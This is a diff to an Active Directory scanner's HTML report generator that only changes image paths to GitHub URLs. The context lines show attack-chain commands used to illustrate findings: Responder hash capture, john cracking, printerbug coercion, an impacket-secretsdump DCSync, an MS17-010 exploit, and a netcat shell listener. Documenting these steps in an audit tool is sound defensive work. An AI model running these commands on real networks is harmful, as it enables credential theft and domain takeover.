@@ -103,7 +103,7 @@ function Generate-Legacyhtml {
                                             <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an LLMNR query to attempt to resolve the hostname on the local LAN.</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                         </span>
                                     </div>
                                     <hr>
@@ -113,7 +113,7 @@ function Generate-Legacyhtml {
                                             <p class="code">sudo responder -I eth0</p>            
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                         </span>
                                     </div>
                                     <hr>
@@ -123,7 +123,7 @@ function Generate-Legacyhtml {
                                             <p class="code">john -w=./wordlist.txt hash.txt</p>            
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                         </span>
                                     </div>
                                 </td>
@@ -204,7 +204,7 @@ function Generate-Legacyhtml {
                                                     <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an NBT-NS query to attempt to resolve the hostname on the local LAN.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                                 </span>
                                             </div>
                                             <hr>
@@ -214,7 +214,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">sudo responder -I eth0</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                                 </span>
                                             </div>
                                             <hr>
@@ -224,7 +224,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">john -w=./wordlist.txt hash.txt</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                                 </span>
                                             </div>
                                         </td>
@@ -305,7 +305,7 @@ function Generate-Legacyhtml {
                                                     <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an mDNS query to attempt to resolve the hostname on the local LAN.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                                 </span>
                                             </div>
                                             <hr>
@@ -315,7 +315,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">sudo responder -I eth0</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                                 </span>
                                             </div>
                                             <hr>
@@ -325,7 +325,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">john -w=./wordlist.txt hash.txt</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                                 </span>
                                             </div>
                                         </td>
@@ -406,7 +406,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">python3 printerbug.py jack:'Password123!'@192.168.10.141 192.168.10.130 </p> 
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/NTLMv1-1.png" alt="Coercing authentication">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/NTLMv1-1.png" alt="Coercing authentication">
                                                 </span>
                                             </div>
                                             <hr>
@@ -416,7 +416,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">sudo responder -I eth0 --lm</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/NTLMv1-2.png" alt="Retrieving the NTLMv1 password hash">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/NTLMv1-2.png" alt="Retrieving the NTLMv1 password hash">
                                                 </span>
                                             </div>
                                             <hr>
@@ -426,7 +426,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">python3 ntlmv1.py --ntlmv1 <DC hash></p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/NTLMv1-3.png" alt="Cracking the NTLMv1 hash">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/NTLMv1-3.png" alt="Cracking the NTLMv1 hash">
                                                 </span>
                                             </div>
                                             <hr>
@@ -436,7 +436,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes :89aca08404383706e09c9861dfee797e</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/NTLMv1-4.png" alt="Performing a DCSync">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/NTLMv1-4.png" alt="Performing a DCSync">
                                                 </span>
                                             </div>
                                         </td>
@@ -518,7 +518,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">nmap -p 445 10.11.175 -T4 -Pn -script vuln</p> 
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
                                                 </span>
                                             </div>
                                             <hr>
@@ -528,7 +528,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">python send_and_execute.py 10.11.1.5 ms17-010.exe</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
                                                 </span>
                                             </div>
                                             <hr>
@@ -538,7 +538,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">nc -lvnp 443</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
                                                 </span>
                                             </div>
                                             <hr>
@@ -623,7 +623,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">nmap -p 445 10.11.175 -T4 -Pn -script vuln</p> 
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
                                                 </span>
                                             </div>
                                             <hr>
@@ -633,7 +633,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">python send_and_execute.py 10.11.1.5 ms17-010.exe</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
                                                 </span>
                                             </div>
                                             <hr>
@@ -643,7 +643,7 @@ function Generate-Legacyhtml {
                                                     <p class="code">nc -lvnp 443</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
                                                 </span>
                                             </div>
                                             <hr>
